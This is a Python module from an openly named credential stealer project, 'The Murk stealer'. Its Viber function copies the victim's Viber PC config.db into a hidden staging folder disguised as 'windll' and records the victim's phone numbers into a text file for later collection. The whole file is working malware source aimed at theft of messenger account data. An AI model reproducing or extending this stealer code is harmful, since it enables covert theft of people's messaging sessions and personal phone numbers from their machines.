#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from os import sep,listdir,makedirs,getenv
from shutil import copy2
from manager.logger import Log


def Viber(data):
        try:
            path = 'ViberPC'   
            local = getenv('LOCALAPPDATA')
            roaming = getenv('APPDATA')
            makedirs(rf'{local}\windll\Messengers\Viber')
            copy2(roaming+ sep + path+"/config.db",rf'{local}\windll\Messengers\Viber')
            dirs = listdir(f"{roaming+sep+path}")
            for filename in dirs:
                if (filename.isdigit()):
                    with open(rf"{local}\windll\Messengers\Viber\phoneNumber.txt", "a", encoding="utf-8") as num:
                        num.write("+"+filename)
                    num.close()
            data.append("\n∟📨Viber")
            return data
        except Exception as e:
            Log(f"Viber ---> {e}")
            return data